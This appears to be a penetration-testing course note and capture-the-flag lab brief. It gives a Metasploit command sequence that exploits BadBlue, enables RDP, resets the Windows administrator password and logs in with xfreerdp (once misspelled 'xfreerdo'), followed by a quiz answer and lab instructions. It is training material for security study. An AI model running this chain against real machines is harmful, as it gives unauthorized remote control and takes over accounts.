- Remote Desktop Protocol
- Used to connect to a Windows System
- Port 3389
- Disabled by default
- Requires legitimate credentials (clear text)

Setup exploit
```
search badblue
use exploit/windows/http/badblue_passthru
set target <badblue_version>
exploit
```

Enable RDP exploit
```
search enable_rdp
use post/windows/manage/enable_rdp
set SESSION <session_id>
```

Confirm RDP is running by scanning the target
```
db_nmap -sV -p 3389 <target_ip>
```

Grab user credentials -> or change the credentials
```
net user administrator <password>
```

Connect to windows machine via xfreerdp tool
```
xfreerdo /u:administrator /p:<password> /v:<remote_ip>
```
## Quiz

Which one of the following commands can be used to authenticate with a Windows target via RDP?

	xfreerdp /u:administrator /p:password123 /v:10.10.10.1
## Lab

A Kali GUI machine and a target machine running a vulnerable application are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the vulnerable application using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework. Then, enable the target machine RDP service and access it using xfreerdp tool.

**Note:** rdesktop will not work on this setup as it does not support NLA. Please use xfreerdp to connect to the RDP server.

**Objective:** Your task is to find and exploit the vulnerable application and get the RDP session to find the flag!

Instructions:* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. * The IP address of the target machine is mentioned in the file “/root/Desktop/target” * Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1 * Dictionaries to use: + /usr/share/metasploit-framework/data/wordlists/common_users.txt + /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

```
local ip: 10.10.80.7
remote ip: 10.4.17.109


```